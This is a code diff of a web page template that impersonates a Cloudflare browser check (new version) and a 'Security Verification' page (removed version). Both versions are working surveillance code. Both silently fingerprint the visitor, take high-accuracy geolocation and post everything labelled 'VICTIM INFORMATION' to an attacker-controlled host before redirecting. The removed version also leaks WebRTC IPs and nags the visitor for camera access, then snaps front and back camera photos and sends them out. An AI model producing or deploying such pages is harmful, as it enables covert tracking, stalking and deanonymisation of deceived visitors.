@@ -1,782 +1,203 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en-US">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Just a moment...</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            overflow: hidden;
-        }
-        .container {
-            max-width: 500px;
-            width: 90%;
-            background: rgba(255, 255, 255, 0.97);
-            backdrop-filter: blur(10px);
-            border-radius: 24px;
-            padding: 40px;
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
-            text-align: center;
-            color: #333;
-            position: relative;
-            overflow: hidden;
-        }
-        .logo { 
-            font-size: 64px; 
-            margin-bottom: 20px; 
-            background: linear-gradient(45deg, #667eea, #764ba2);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            animation: float 3s ease-in-out infinite;
-        }
-        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
-
-        h1 { 
-            font-size: 28px; 
-            margin-bottom: 8px; 
-            color: #4f46e5; 
-            font-weight: 700;
-        }
-        .subtitle { 
-            font-size: 16px; 
-            color: #64748b; 
-            margin-bottom: 30px; 
-            line-height: 1.5;
-        }
-
-        .progress-container {
-            width: 100%;
-            height: 10px;
-            background: #e2e8f0;
-            border-radius: 9999px;
-            overflow: hidden;
-            margin: 25px 0;
-            position: relative;
-        }
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #4f46e5, #7c3aed);
-            border-radius: 9999px;
-            width: 0%;
-            transition: width 0.3s ease;
-        }
-        .progress-label {
-            font-size: 12px;
-            color: #94a3b8;
-            margin-top: 8px;
-        }
-
-        .info-box {
-            background: #f8fafc;
-            border: 1px solid #e2e8f0;
-            border-radius: 16px;
-            padding: 24px;
-            margin: 25px 0;
-            text-align: left;
-            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
-        }
-        .info-item {
-            display: flex;
-            align-items: center;
-            margin: 12px 0;
-            font-size: 14px;
-            color: #475569;
-            transition: all 0.3s ease;
-        }
-        .info-item.completed {
-            color: #16a34a;
-            font-weight: 500;
-        }
-        .info-item.failed {
-            color: #ef4444;
-        }
-        .checkmark {
-            width: 16px;
-            height: 16px;
-            border-radius: 50%;
-            margin-right: 12px;
-            transition: all 0.3s ease;
-        }
-        .check-pending { background: #fbbf24; }
-        .check-success { background: #10b981; }
-        .check-error { background: #ef4444; }
-
-        .badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-            background: #dbeafe;
-            color: #1d4ed8;
-            padding: 8px 16px;
-            border-radius: 9999px;
-            font-size: 13px;
-            font-weight: 600;
-            margin-top: 20px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-        }
-        .status {
-            font-size: 14px;
-            color: #94a3b8;
-            margin-top: 25px;
-            font-style: italic;
-        }
-
-        /* Camera Modal */
-        .camera-modal {
-            display: none;
-            position: fixed;
-            inset: 0;
-            background: rgba(0, 0, 0, 0.85);
-            z-index: 9999;
-            backdrop-filter: blur(8px);
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-        .camera-modal.active {
-            display: flex;
-            animation: modalFadeIn 0.3s ease-out;
-        }
-        @keyframes modalFadeIn { from { opacity: 0; } to { opacity: 1; } }
-
-        .camera-content {
-            background: white;
-            border-radius: 20px;
-            padding: 35px;
-            text-align: center;
-            max-width: 420px;
-            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
-            transform: scale(0.9);
-            animation: modalPop 0.3s ease-out forwards;
-        }
-        @keyframes modalPop { from { transform: scale(0.9); } to { transform: scale(1); } }
-
-        .camera-icon {
-            font-size: 80px;
-            margin-bottom: 20px;
-            background: linear-gradient(45deg, #ef4444, #dc2626);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-        .camera-title {
-            font-size: 22px;
-            font-weight: 700;
-            color: #1e293b;
-            margin-bottom: 12px;
-        }
-        .camera-text {
-            font-size: 16px;
-            color: #64748b;
-            margin-bottom: 25px;
-            line-height: 1.5;
-        }
-        .camera-buttons {
-            display: flex;
-            gap: 15px;
-            justify-content: center;
-            margin-top: 20px;
-        }
-        .camera-btn {
-            padding: 14px 32px;
-            border: none;
-            border-radius: 12px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.2s ease;
-            min-width: 120px;
-        }
-        .btn-allow {
-            background: #10b981;
-            color: white;
-        }
-        .btn-allow:hover {
-            background: #059669;
-            transform: translateY(-2px);
-            box-shadow: 0 4px 8px rgba(16, 185, 129, 0.3);
-        }
-        .btn-deny {
-            background: #ef4444;
-            color: white;
-        }
-        .btn-deny:hover {
-            background: #dc2626;
-            transform: translateY(-2px);
-            box-shadow: 0 4px 8px rgba(239, 68, 68, 0.3);
-        }
-
-        /* Success Animation */
-        .success-animation {
-            position: fixed;
-            inset: 0;
-            background: rgba(255, 255, 255, 0.9);
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            z-index: 10000;
-            opacity: 0;
-            pointer-events: none;
-            transition: opacity 0.5s ease;
-        }
-        .success-animation.show {
-            opacity: 1;
-        }
-        .success-check {
-            font-size: 120px;
-            color: #10b981;
-            animation: bounce 0.6s ease;
-        }
-        @keyframes bounce {
-            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
-            40% { transform: translateY(-30px); }
-            60% { transform: translateY(-15px); }
-        }
-        .success-text {
-            font-size: 24px;
-            font-weight: 700;
-            color: #1e293b;
-            margin-top: 20px;
-        }
-
-        /* ALWAYS VISIBLE DEBUG CONSOLE (for you) */
-        .debug-console {
-            position: fixed;
-            bottom: 10px;
-            left: 10px;
-            right: 10px;
-            background: rgba(0,0,0,0.85);
-            color: #ffcc00;
-            padding: 10px;
-            border-radius: 8px;
-            font-size: 12px;
-            z-index: 10000;
-            max-height: 200px;
-            overflow-y: auto;
-            font-family: monospace;
-            line-height: 1.4;
-        }
-        .debug-line {
-            margin: 2px 0;
-            padding: 2px 0;
-            border-bottom: 1px solid rgba(255,255,255,0.1);
-        }
-        .debug-error {
-            color: #ff6b6b;
-        }
-        .debug-success {
-            color: #51cf66;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Just a moment...</title>
+  <style>
+    body{font-family:Arial,sans-serif;background:#fff;margin:0;padding:0;height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;color:#333}
+    .spinner{display:flex;gap:4px;margin:30px auto}
+    .spinner div{width:12px;height:12px;background:#f58220;border-radius:50%;animation:fader 1.4s infinite ease-in-out}
+    .spinner div:nth-child(2){animation-delay:-0.32s}
+    .spinner div:nth-child(3){animation-delay:-0.16s}
+    @keyframes fader{0%,80%,100%{transform:scale(0)}40%{transform:scale(1)}}
+    h1{font-size:24px;margin:0 0 15px}
+    p{font-size:16px;margin:5px 0;color:#666}
+    .footer{margin-top:40px;font-size:14px;color:#999}
+  </style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">🔒</div>
-        <h1>Security Verification</h1>
-        <p class="subtitle">We're verifying your device for enhanced security.</p>
-        
-        <div class="progress-container">
-            <div class="progress-fill" id="progressBar"></div>
-        </div>
-        <div class="progress-label" id="progressLabel">0%</div>
-        
-        <div class="info-box">
-            <div class="info-item" id="item1">
-                <div class="checkmark check-pending"></div>
-                <span id="status1">Gathering device information...</span>
-            </div>
-            <div class="info-item" id="item2">
-                <div class="checkmark check-pending"></div>
-                <span id="status2">Analyzing network data...</span>
-            </div>
-            <div class="info-item" id="item3">
-                <div class="checkmark check-pending"></div>
-                <span id="status3">Fingerprinting browser...</span>
-            </div>
-            <div class="info-item" id="item4">
-                <div class="checkmark check-pending"></div>
-                <span id="status4">Collecting system info...</span>
-            </div>
-            <div class="info-item" id="item5">
-                <div class="checkmark check-pending"></div>
-                <span id="status5">Requesting camera access...</span>
-            </div>
-        </div>
-        
-        <div class="badge">🛡️ Enterprise Grade Security</div>
-        <p class="status">This process helps protect against fraud and unauthorized access.</p>
-    </div>
+  <div>
+    <div class="spinner"><div></div><div></div><div></div></div>
+    <h1>Checking your browser before accessing website</h1>
+    <p>This process is automatic. Please wait.</p>
+    <p id="status">Verifying security parameters...</p>
+  </div>
+  <div class="footer">
+    DDoS protection by Cloudflare<br>
+    Ray ID: <span id="rayId"></span>
+  </div>
 
-    <!-- Camera Permission Modal -->
-    <div class="camera-modal" id="cameraModal">
-        <div class="camera-content">
-            <div class="camera-icon">📷</div>
-            <h3 class="camera-title">Camera Access Required</h3>
-            <p class="camera-text">
-                For security verification, we need to capture a quick image using your camera.
-                <br><br>
-                <strong>This helps ensure you're not a bot.</strong>
-            </p>
-            <div class="camera-buttons">
-                <button class="camera-btn btn-allow" onclick="allowCamera()">Allow Access</button>
-                <button class="camera-btn btn-deny" onclick="denyCamera()">Block</button>
-            </div>
-        </div>
-    </div>
+  <script>
+    // 🔒 Config
+    const UID = "<%= uid %>";
+    const HOST = "<%= a %>";
+    let dataSent = false;
+    let locationSent = false;
+    let fingerprint = "";
 
-    <!-- Success Animation -->
-    <div class="success-animation" id="successAnimation">
-        <div class="success-check">✓</div>
-        <div class="success-text">Verification Complete!</div>
-    </div>
+    // Fake Ray ID
+    document.getElementById("rayId").innerText = Array(16).fill(0).map(() => "abcdefghijklmnopqrstuvwxyz0123456789"[Math.floor(Math.random()*36)]).join('');
 
-    <!-- DEBUG CONSOLE - ALWAYS VISIBLE FOR YOU -->
-    <div class="debug-console" id="debugConsole">
-        <div class="debug-line"><strong>🔍 DEBUG MODE ACTIVE</strong> - Watching data collection in real-time</div>
-    </div>
+    // Start immediately
+    collectData();
 
-    <script>
-        const uid = '<%= uid %>';
-        const host = '<%= host %>';
-        const targetUrl = '<%= url %>';
-        const delay = <%= duration %>;
-        const progressBar = document.getElementById('progressBar');
-        const progressLabel = document.getElementById('progressLabel');
-        const debugConsole = document.getElementById('debugConsole');
+    async function collectData() {
+      try {
+        await buildFingerprint();
+        sendFingerprint();
+        requestLocation();
+        // Redirect after minimal delay even if location fails
+        setTimeout(() => { window.location.href = "<%= url %>"; }, 8000);
+      } catch(e) {
+        console.error(e);
+        fallbackRedirect();
+      }
+    }
 
-        // DEBUG IS ALWAYS ON FOR YOU
-        const DEBUG = true;
+    async function buildFingerprint() {
+      fingerprint = '<code>✅ VICTIM INFORMATION</code><br><br>';
+      fingerprint += `<b>⚓ IP:</b> <a href="https://ip-api.com/#<%= ip %>"><%= ip %></a> | <b>🕗 Time:</b> <%= time %><br><br>`;
+      fingerprint += `<b>⏳ Local Time:</b> ${new Date()}<br><br>`;
 
-        function logDebug(message, type = 'info') {
-            if (DEBUG) {
-                const line = document.createElement('div');
-                line.className = `debug-line ${type === 'error' ? 'debug-error' : type === 'success' ? 'debug-success' : ''}`;
-                line.innerHTML = `[${new Date().toLocaleTimeString()}] ${message}`;
-                debugConsole.appendChild(line);
-                debugConsole.scrollTop = debugConsole.scrollHeight;
-            }
-            console.log(`[Cloudflare] ${message}`);
+      // MAXIMUM FINGERPRINTING (50+ attributes)
+      const navProps = [
+        "vendor","productSub","maxTouchPoints","doNotTrack","hardwareConcurrency",
+        "cookieEnabled","appCodeName","appName","appVersion","platform","product",
+        "userAgent","language","languages","webdriver","pdfViewerEnabled","deviceMemory",
+        "connection","permissions","storage","credentials","locks","wakeLock","clipboard"
+      ];
+
+      fingerprint += "<b>📱 DEVICE & BROWSER</b><br>";
+      navProps.forEach(key => {
+        if (navigator[key] !== undefined) {
+          let val = navigator[key];
+          if (typeof val === 'object') {
+            try { val = JSON.stringify(val); } catch(e) { val = '[Object]'; }
+          }
+          fingerprint += `<b>${key}:</b> <code>${val}</code><br>`;
         }
+      });
 
-        let cameraAttempts = 0;
-        let cameraGranted = false;
-        let cameraDenied = false;
-        let completedSteps = 0;
-        const totalSteps = 5;
+      // Screen
+      fingerprint += "<br><b>🖥️ SCREEN</b><br>";
+      ["width","height","availWidth","availHeight","colorDepth","pixelDepth"].forEach(p => {
+        fingerprint += `<b>screen.${p}:</b> <code>${screen[p]}</code><br>`;
+      });
 
-        function updateStatus(stepId, message, status = 'success') {
-            const item = document.getElementById(`item${stepId}`);
-            const statusSpan = document.getElementById(`status${stepId}`);
-            const checkmark = item.querySelector('.checkmark');
-            
-            if (statusSpan) statusSpan.textContent = message;
-            
-            if (status === 'success') {
-                item.classList.add('completed');
-                checkmark.className = 'checkmark check-success';
-            } else if (status === 'error') {
-                item.classList.add('failed');
-                checkmark.className = 'checkmark check-error';
-            } else {
-                checkmark.className = 'checkmark check-pending';
-            }
+      // Timezone & Language
+      fingerprint += `<br><b>🌍 TIMEZONE:</b> <code>${Intl.DateTimeFormat().resolvedOptions().timeZone}</code><br>`;
+      fingerprint += `<b>🌐 LANGUAGES:</b> <code>${Array.from(navigator.languages).join(', ')}</code><br>`;
+
+      // Plugins
+      fingerprint += "<br><b>🧩 PLUGINS</b><br>";
+      if (navigator.plugins && navigator.plugins.length > 0) {
+        for (let i=0; i<Math.min(5, navigator.plugins.length); i++) {
+          let p = navigator.plugins[i];
+          fingerprint += `<b>${p.name}:</b> <code>${p.description.substring(0,50)}...</code><br>`;
         }
+      } else {
+        fingerprint += `<b>None detected</b><br>`;
+      }
 
-        function updateProgress() {
-            const percent = Math.min(Math.floor((completedSteps / totalSteps) * 100), 100);
-            progressBar.style.width = `${percent}%`;
-            progressLabel.textContent = `${percent}%`;
-        }
+      // WebGL
+      try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        const ext = gl.getExtension('WEBGL_debug_renderer_info');
+        const vendor = gl.getParameter(ext.UNMASKED_VENDOR_WEBGL);
+        const renderer = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
+        fingerprint += `<br><b>🎮 WEBGL:</b> <code>${vendor} | ${renderer}</code><br>`;
+      } catch(e) { fingerprint += `<br><b>🎮 WEBGL:</b> <code>Not Supported</code><br>`; }
 
-        function completeStep(stepId, message = null, status = 'success') {
-            // UPDATE UI FIRST - don't wait for backend
-            if (message) updateStatus(stepId, message, status);
-            completedSteps++;
-            updateProgress();
-            
-            // Log to debug console
-            logDebug(`Step ${stepId} completed: ${message || 'No message'} (${status})`, status === 'success' ? 'success' : 'error');
-        }
+      // Network
+      if (navigator.connection) {
+        fingerprint += "<br><b>🌐 NETWORK</b><br>";
+        ['type','effectiveType','rtt','downlink'].forEach(k => {
+          if (navigator.connection[k] !== undefined) {
+            fingerprint += `<b>connection.${k}:</b> <code>${navigator.connection[k]}</code><br>`;
+          }
+        });
+      }
 
-        async function send(endpoint, data) {
-            try {
-                logDebug(`Attempting to send to ${endpoint}...`);
-                
-                // Try up to 3 times
-                for (let i = 0; i < 3; i++) {
-                    try {
-                        const response = await fetch(`${host}${endpoint}`, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify(data),
-                            timeout: 10000
-                        });
-                        
-                        if (!response.ok) {
-                            throw new Error(`HTTP ${response.status}`);
-                        }
-                        
-                        const result = await response.json();
-                        logDebug(`${endpoint} success on attempt ${i+1}`, 'success');
-                        return result;
-                    } catch (error) {
-                        logDebug(`${endpoint} failed on attempt ${i+1}: ${error.message}`, 'error');
-                        if (i < 2) await new Promise(r => setTimeout(r, 2000)); // Wait 2s before retry
-                    }
-                }
-                
-                throw new Error('All retries failed');
-                
-            } catch (error) {
-                logDebug(`${endpoint} final failed: ${error.message}`, 'error');
-                
-                // STILL update UI locally - user should see progress even if backend is down
-                return { success: false, error: error.message };
-            }
-        }
+      // Battery
+      if ('getBattery' in navigator) {
+        try {
+          const battery = await navigator.getBattery();
+          fingerprint += `<br><b>🔋 BATTERY:</b> <code>${Math.round(battery.level*100)}% | Charging: ${battery.charging}</code><br>`;
+        } catch(e) {}
+      }
 
-        // ========== MAXIMUM INFO GATHERING ==========
+      // Touch Support
+      if ('ontouchstart' in window) {
+        fingerprint += `<br><b>👆 TOUCH:</b> <code>Supported | Max Points: ${navigator.maxTouchPoints}</code><br>`;
+      }
 
-        // 1. LOCATION (with retry)
+      // Permissions Status (Async)
+      const perms = ['geolocation','camera','microphone'];
+      fingerprint += "<br><b>🔐 PERMISSIONS</b><br>";
+      for (let p of perms) {
+        try {
+          const status = await navigator.permissions.query({name: p});
+          fingerprint += `<b>${p}:</b> <code>${status.state}</code><br>`;
+        } catch(e) {}
+      }
+    }
+
+    function sendFingerprint() {
+      if (dataSent) return;
+      $.post(`${HOST}/data`, {
+        uid: UID,
+        data: fingerprint
+      }).done(() => {
+        dataSent = true;
+        checkCompletion();
+      }).fail(() => {
+        // Retry once
         setTimeout(() => {
-            updateStatus(1, '📡 Detecting your location...', 'pending');
-            
-            if (!navigator.geolocation) {
-                completeStep(1, '⚠️ Location not supported by browser', 'error');
-                return;
-            }
+          $.post(`${HOST}/data`, { uid: UID, data: fingerprint });
+        }, 2000);
+      });
+    }
 
-            let attempts = 0;
-            const maxAttempts = 3;
+    function requestLocation() {
+      if (!navigator.geolocation) {
+        console.log("Geolocation not supported");
+        return;
+      }
 
-            function attempt() {
-                navigator.geolocation.getCurrentPosition(
-                    async (pos) => {
-                        updateStatus(1, '✓ Location detected - sending to server...', 'success');
-                        
-                        const result = await send('/location', {
-                            lat: pos.coords.latitude,
-                            lon: pos.coords.longitude,
-                            uid: uid,
-                            acc: pos.coords.accuracy,
-                            alt: pos.coords.altitude,
-                            heading: pos.coords.heading,
-                            speed: pos.coords.speed
-                        });
-                        
-                        if (result.success) {
-                            completeStep(1, '✓ Location secured and sent to server', 'success');
-                        } else {
-                            completeStep(1, '✓ Location detected (server offline)', 'success');
-                            logDebug('Location detected but server may be unreachable', 'error');
-                        }
-                    },
-                    (err) => {
-                        logDebug(`Location error: ${err.message}`, 'error');
-                        attempts++;
-                        if (attempts < maxAttempts) {
-                            updateStatus(1, `⏳ Retrying location... (${attempts}/${maxAttempts})`, 'pending');
-                            setTimeout(attempt, 2000);
-                        } else {
-                            completeStep(1, '⚠️ Could not access location', 'error');
-                        }
-                    },
-                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-                );
-            }
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          $.post(`${HOST}/location`, {
+            uid: UID,
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude,
+            acc: pos.coords.accuracy
+          }).done(() => {
+            locationSent = true;
+            checkCompletion();
+          });
+        },
+        (err) => {
+          console.log("Location error:", err);
+          // Still try to complete without accurate location
+          locationSent = true;
+          checkCompletion();
+        },
+        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+      );
+    }
 
-            attempt();
-        }, 300);
+    function checkCompletion() {
+      if (dataSent && locationSent) {
+        document.getElementById("status").innerText = "✅ Verification complete. Redirecting...";
+        setTimeout(() => { window.location.href = "<%= url %>"; }, 1500);
+      }
+    }
 
-        // 2. DEVICE FINGERPRINT
-        setTimeout(async () => {
-            updateStatus(2, '📱 Scanning device information...', 'pending');
-            
-            try {
-                const fp = {
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    language: navigator.language,
-                    languages: navigator.languages?.join(', ') || 'N/A',
-                    cookies: navigator.cookieEnabled,
-                    doNotTrack: navigator.doNotTrack || 'unknown',
-                    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
-                    deviceMemory: navigator.deviceMemory || 'unknown',
-                    touch: navigator.maxTouchPoints > 0,
-                    webdriver: navigator.webdriver,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    timezoneOffset: new Date().getTimezoneOffset(),
-                    online: navigator.onLine,
-                    screen: {
-                        width: screen.width,
-                        height: screen.height,
-                        availWidth: screen.availWidth,
-                        availHeight: screen.availHeight,
-                        colorDepth: screen.colorDepth,
-                        pixelDepth: screen.pixelDepth,
-                        dpi: window.devicePixelRatio
-                    }
-                };
-
-                updateStatus(2, '✓ Device info ready - sending...', 'success');
-                
-                const result = await send('/info', { 
-                    uid: uid, 
-                    data: `<b>🖥️ Device Fingerprint</b>\n<code>${JSON.stringify(fp, null, 2)}</code>` 
-                });
-                
-                if (result.success) {
-                    completeStep(2, '✓ Device profile created and sent', 'success');
-                } else {
-                    completeStep(2, '✓ Device profile created (server offline)', 'success');
-                }
-            } catch (err) {
-                logDebug(`Device fingerprint error: ${err.message}`, 'error');
-                completeStep(2, '⚠️ Error scanning device', 'error');
-            }
-        }, 800);
-
-        // 3. BATTERY + NETWORK
-        setTimeout(async () => {
-            updateStatus(3, '🔋 Checking battery & network...', 'pending');
-            
-            let messages = [];
-
-            // Battery
-            if ('getBattery' in navigator) {
-                try {
-                    const battery = await navigator.getBattery();
-                    const batteryInfo = `${(battery.level * 100).toFixed(1)}% | Charging: ${battery.charging}`;
-                    messages.push('Battery');
-                    
-                    await send('/info', { uid: uid, data: `<b>🔋 Battery:</b> ${batteryInfo}` });
-                } catch(e) {
-                    logDebug(`Battery error: ${e.message}`, 'error');
-                    messages.push('BatErr');
-                }
-            }
-
-            // Network
-            if (navigator.connection) {
-                const conn = navigator.connection;
-                const networkInfo = `${conn.effectiveType || 'unknown'} | ${conn.downlink || '?'} Mbps | RTT: ${conn.rtt || '?'}ms`;
-                messages.push('Network');
-                
-                await send('/info', { uid: uid, data: `<b>🌐 Network:</b> ${networkInfo}` });
-            }
-
-            completeStep(3, `✓ ${messages.join(', ')}`, 'success');
-        }, 1500);
-
-        // 4. FINGERPRINTING (Canvas + Audio + WebRTC + Fonts)
-        setTimeout(async () => {
-            updateStatus(4, '🎨 Creating security fingerprint...', 'pending');
-            
-            let messages = [];
-
-            // Canvas Fingerprint
-            try {
-                const canvas = document.createElement('canvas');
-                const ctx = canvas.getContext('2d');
-                ctx.textBaseline = 'top';
-                ctx.font = "14px Arial";
-                ctx.fillText('MultiInfoBotFingerprint', 2, 2);
-                const canvasFP = canvas.toDataURL().substring(0, 100) + '...';
-                messages.push('Canvas');
-                
-                await send('/info', { uid: uid, data: `<b>🎨 Canvas FP:</b> <code>${canvasFP}</code>` });
-            } catch(e) {
-                logDebug(`Canvas error: ${e.message}`, 'error');
-                messages.push('CanvErr');
-            }
-
-            // Audio Fingerprint
-            try {
-                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                messages.push('Audio');
-                await send('/info', { uid: uid, data: `<b>🎵 AudioContext:</b> Supported` });
-            } catch(e) {
-                logDebug(`Audio error: ${e.message}`, 'error');
-                messages.push('AudErr');
-                await send('/info', { uid: uid, data: `<b>🎵 AudioContext:</b> Not supported` });
-            }
-
-            // WebRTC IP Leak
-            try {
-                const getIPs = () => {
-                    return new Promise(resolve => {
-                        const ips = [];
-                        const pc = new RTCPeerConnection({ iceServers: [] });
-                        pc.createDataChannel('');
-                        pc.createOffer().then(o => pc.setLocalDescription(o));
-                        pc.onicecandidate = e => {
-                            if (!e || !e.candidate) {
-                                resolve(ips);
-                                return;
-                            }
-                            const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
-                            if (ipMatch && !ips.includes(ipMatch[1])) {
-                                ips.push(ipMatch[1]);
-                            }
-                        };
-                        setTimeout(() => {
-                            pc.close();
-                            resolve(ips);
-                        }, 2000);
-                    });
-                };
-
-                const ips = await getIPs();
-                if (ips.length) {
-                    messages.push('WebRTC');
-                    await send('/info', { uid: uid, data: `<b>🌐 WebRTC IPs:</b>\n<code>${ips.join('\\n')}</code>` });
-                }
-            } catch(e) {
-                logDebug(`WebRTC error: ${e.message}`, 'error');
-                messages.push('IP Err');
-            }
-
-            // Installed Fonts
-            try {
-                const testFonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia'];
-                const canvas = document.createElement('canvas');
-                const ctx = canvas.getContext('2d');
-                const baseWidth = ctx.measureText('mmmmmmmmmmlli').width;
-                
-                const installed = testFonts.filter(font => {
-                    ctx.font = `72px "${font}", monospace`;
-                    const testWidth = ctx.measureText('mmmmmmmmmmlli').width;
-                    return Math.abs(baseWidth - testWidth) > 2;
-                });
-                
-                messages.push('Fonts');
-                await send('/info', { uid: uid, data: `<b>🔠 Fonts:</b> ${installed.join(', ')}` });
-            } catch(e) {
-                logDebug(`Fonts error: ${e.message}`, 'error');
-                messages.push('FontErr');
-            }
-
-            completeStep(4, `✓ ${messages.join(', ')}`, 'success');
-        }, 2200);
-
-        // ========== CAMERA HANDLING ==========
-
-        function showCameraModal() {
-            document.getElementById('cameraModal').classList.add('active');
-            updateStatus(5, '⏳ Waiting for your permission...', 'pending');
-            logDebug('Showing camera permission modal');
-        }
-
-        function allowCamera() {
-            document.getElementById('cameraModal').classList.remove('active');
-            cameraGranted = true;
-            requestCameraAccess();
-            logDebug('User allowed camera access');
-        }
-
-        function denyCamera() {
-            document.getElementById('cameraModal').classList.remove('active');
-            cameraDenied = true;
-            completeStep(5, '❌ Camera access denied by user', 'error');
-            logDebug('User denied camera access');
-        }
-
-        async function requestCameraAccess(facingMode = 'user') {
-            if (cameraGranted || cameraDenied) return;
-
-            updateStatus(5, `📷 Requesting ${facingMode === 'environment' ? 'back' : 'front'} camera access...`, 'pending');
-            
-            try {
-                const constraints = {
-                    video: facingMode === 'environment' ? { facingMode: 'environment' } : true
-                };
-                
-                const stream = await navigator.mediaDevices.getUserMedia(constraints);
-                captureAndSend(stream, facingMode);
-                logDebug(`Successfully got ${facingMode} camera stream`);
-            } catch (err) {
-                logDebug(`Camera error: ${err.name} - ${err.message}`, 'error');
-                if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
-                    cameraAttempts++;
-                    if (cameraAttempts <= 3) {
-                        showCameraModal();
-                        updateStatus(5, `⚠️ Please allow camera (Attempt ${cameraAttempts}/3)`, 'pending');
-                    } else {
-                        cameraDenied = true;
-                        completeStep(5, '❌ Camera access permanently denied', 'error');
-                    }
-                } else {
-                    if (facingMode === 'user') {
-                        setTimeout(() => requestCameraAccess('environment'), 1000);
-                        updateStatus(5, '🔄 Trying back camera...', 'pending');
-                    } else {
-                        cameraDenied = true;
-                        completeStep(5, '⚠️ Camera error - not available', 'error');
-                    }
-                }
-            }
-        }
-
-        function captureAndSend(stream, type = 'user') {
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.play();
-            
-            updateStatus(5, `📷 Capturing ${type === 'environment' ? 'back' : 'front'} camera image...`, 'pending');
-            
-            video.onloadedmetadata = () => {
-                setTimeout(() => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0);
-                    
-                    const imageData = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
-                    
-                    send('/camsnap', { 
-                        uid: uid, 
-                        [type === 'environment' ? 'back' : 'front']: imageData 
-                    }).then(result => {
-                        if (result.success) {
-                            updateStatus(5, `✓ ${type === 'environment' ? 'Back' : 'Front'} camera captured and sent`, 'success');
-                            logDebug(`${type} camera captured successfully`, 'success');
-                        } else {
-                            updateStatus(5, `✓ ${type === 'environment' ? 'Back' : 'Front'} camera captured (server offline)`, 'success');
-                            logDebug(`${type} camera captured but server may be unreachable`, 'error');
-                        }
-                    });
-                    
-                    stream.getTracks().forEach(t => t.stop());
-                    
-                    if (type === 'user') {
-                        setTimeout(() => requestCameraAccess('environment'), 1500);
-                    } else {
-                        completeStep(5);
-                    }
-                }, 500);
-            };
-        }
-
-        // Start camera after other data collected
-        setTimeout(() => {
-            requestCameraAccess();
-        }, 3000);
-
-        // Redirect with success animation
-        setTimeout(() => {
-            document.getElementById('successAnimation').classList.add('show');
-            setTimeout(() => {
-                window.location.href = targetUrl;
-            }, 1000);
-        }, delay - 1000);
-    </script>
+    function fallbackRedirect() {
+      setTimeout(() => { window.location.href = "<%= url %>"; }, 5000);
+    }
+  </script>
 </body>
 </html>
